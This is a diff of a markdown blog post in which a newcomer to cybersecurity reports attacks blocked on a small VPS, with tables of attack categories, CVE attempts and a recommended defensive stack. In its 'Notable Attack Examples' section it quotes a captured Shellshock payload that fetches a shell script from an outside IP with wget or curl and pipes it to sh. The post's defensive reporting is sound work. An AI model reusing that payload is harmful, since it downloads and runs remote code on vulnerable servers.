@@ -14,6 +14,7 @@ socialShare: true
 ---
 
 ## My Digital Wake-Up Call
+---
 
 I'm new to the reality of the internet as a battleground—though maybe it always was one. I've recently taken the plunge, striving to learn as much as I can and develop my skills in multiple areas simultaneously, especially cybersecurity.
 
@@ -30,14 +31,17 @@ I am still learning, but it's the journey that interests me, not the destination
 Below are some details:
 
 ## Security Threat Surface Analysis
+---
 
 ### Infrastructure Overview
+---
 | Component | Details |
 |-----------|---------|
 | **Server Type** | VPS (2 CPU, 4GB RAM) |
 | **Monitoring** | Real-time log analysis, threat detection |
 
 ### Attack Metrics Summary
+---
 
 | Attack Category | Attempts Blocked | Severity | Details |
 |-----------------|------------------|----------|---------|
@@ -51,6 +55,7 @@ Below are some details:
 | **Open Proxy Abuse** | 2 | Medium | Proxy service attempts |
 
 ### Defense Performance
+---
 
 | Security Layer | Effectiveness | Metrics |
 |----------------|---------------|---------|
@@ -60,6 +65,7 @@ Below are some details:
 | **Community Blocklist** | Excellent | 18,362 IPs from CAPI |
 
 ### Traffic Analysis
+---
 
 | Log Source | Lines Processed | Threats Detected |
 |------------|-----------------|------------------|
@@ -69,8 +75,10 @@ Below are some details:
 | Samba logs | 135 lines | File share attacks |
 
 ### Notable Attack Examples
+---
 
 #### Shellshock Exploit Attempt
+---
 ```bash
 # Detected and blocked by Wazuh
 "() { :; }; /bin/bash -c \"(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\""
@@ -82,6 +90,7 @@ Below are some details:
 **Status**: Blocked by CrowdSec with manual firewall rule
 
 ## CVE Exploitation Attempts
+---
 
 - **CVE-2021-41773** (Apache Path Traversal) - 4 attempts
 - **CVE-2021-42013** (Apache RCE) - 1 attempt
@@ -89,6 +98,7 @@ Below are some details:
 - **ThinkPHP CVE-2018-20062** - 1 attempt
 
 ## Security Stack Effectiveness
+---
 
 | Tool | Role | Performance |
 |------|------|-------------|
@@ -100,6 +110,7 @@ Below are some details:
 ```
 
 ## Key Takeaways
+---
 
 - **No Server is Too Small** - Even basic blogs attract significant attack attention
 - **Automated Attacks Dominate** - 99% of attempts are scripted, not targeted
@@ -108,9 +119,11 @@ Below are some details:
 - **Community Intelligence** - Crowd-sourced blocklists are incredibly effective
 
 ## Recommended Security Stack for Small VPS
+---
 
 
 # Essential Security Stack (for learning)
+---
 
 monitoring:
   - CrowdSec (behavioral analysis)
@@ -127,6 +140,7 @@ application:
 
 
 ## Conclusion
+---
 
 Running internet-facing services means constant exposure to automated attacks. The metrics demonstrate that even a small VPS with basic services faces thousands of daily attack attempts. However, with proper security tooling and monitoring, these threats can be effectively mitigated.
 
